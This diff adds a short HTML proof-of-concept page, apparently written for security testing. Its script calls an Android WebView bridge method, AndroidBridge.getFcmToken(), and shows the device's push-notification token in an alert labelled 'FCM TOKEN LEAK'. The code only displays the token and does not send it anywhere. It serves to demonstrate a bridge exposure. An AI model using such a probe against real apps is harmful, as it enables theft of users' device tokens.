@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head><title>fcm-token-test</title></head>
+<body>
+<h1>fcm-token-test</h1>
+<script>
+(function() {
+  var out = document.createElement('pre');
+  out.style.whiteSpace = 'pre-wrap';
+  document.body.appendChild(out);
+  function log(s) { out.textContent += s + "\n"; }
+  try {
+    var r = window.AndroidBridge.getFcmToken();
+    log("getFcmToken() = " + r);
+    alert("FCM TOKEN LEAK:\n" + r);
+  } catch (e) {
+    log("EXCEPTION: " + e);
+    alert("EXCEPTION: " + e);
+  }
+})();
+</script>
+</body>
+</html>
